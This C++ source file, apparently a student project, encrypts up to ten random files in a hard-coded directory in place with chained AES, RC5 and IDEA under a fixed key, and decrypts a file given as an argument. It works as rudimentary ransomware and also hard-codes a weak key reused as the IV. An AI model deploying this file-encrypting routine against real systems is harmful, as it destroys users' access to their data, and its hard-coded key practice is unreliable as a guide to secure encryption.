/**
* @author Jan Wieczorek 21024
* @author Tymoteusz Urbanowicz 20149
*/



#include <fstream>
#include <iostream>
#include <string>
#include <filesystem>
#include <random>

#include "cryptoFunc.h"

/** encryption key */
const std::vector<uint8_t> key = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm'};
/** initialization vector */
const std::vector<uint8_t> iv = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm' };

/**
* Funtion uses three encryption algorithms:
* AES
* RC5
* IDEA
* in this order to encrypt a file using key and iv delcared in this file as global variables
* 
* 
* @param[in]    path        file to be encrypted
* 
*/

void encryptFile(std::string path) {



    std::string cipherAes, cipherRc5, cipherIdea;

    std::fstream file;

    file.open(path, std::ios::in);
    std::string payload;
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            payload += line + "\n";
        }
    }
    file.close();

    cipherAes = encryptAes(payload, key, iv);
    cipherRc5 = encryptRc5(cipherAes, key, iv);
    cipherIdea = encryptIdea(cipherRc5, key, iv);


    file.open(path, std::ios::out);
    if (file.is_open())
        file << cipherIdea;
    file.close();
    std::cout << cipherIdea << std::endl;
}

/**
* Funtion uses three encryption algorithms:
* IDEA
* RC5
* AES
* in this order to encrypt a file using key and iv delcared in this file as global variables
*
*
* @param[in]    path        file to be decrypted
*
*/

void decryptFile(std::string path) {
    std::string recoverAes, recoverRc5, recoverIdea;

    std::fstream file;

    file.open(path, std::ios::in);
    std::string payload;
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            payload += line;
        }
    }
    file.close();

    recoverIdea = decryptIdea(payload, key, iv);
    recoverRc5 = decryptRc5(recoverIdea, key, iv);
    recoverAes = decryptAes(recoverRc5, key, iv);


    file.open(path, std::ios::out);
    if (file.is_open())
        file << recoverAes;
    file.close();

}

/**
* Main function that scans specific directory for files and 
* if the number of files exceeds 10 encrypts random 10 of them
* otherwise encrypts them all. If executed with a command line argument
* function will decrypt previously encrypted by this program file
* given the command line argument is it's path
* 
* @input[in]     argv[1]        file to be decrypted    
* 
*/


int main(int argc, char* argv[]){


    if (argc > 1) {
        decryptFile(argv[1]);
    }
    else {
        std::vector<std::string> files;
        for (const auto& entry : std::filesystem::directory_iterator("..\\very important directory")) {
            files.push_back(entry.path().string());
        }

        if (files.size() > 10) {
            std::random_device rd;
            std::mt19937 mt_generator(rd());
            for (int i = 10; i > 0; i--) {
                std::uniform_int_distribution dst(0, (int)files.size() - 1);
                int pi = dst(mt_generator);
                std::string path = files[pi];
                files.erase(files.begin() + pi);
                encryptFile(path);
            }
        }
        else {
            for (auto f : files) {
                std::cout << f << std::endl;
                encryptFile(f);
            }
        }
    }
    return 0;
}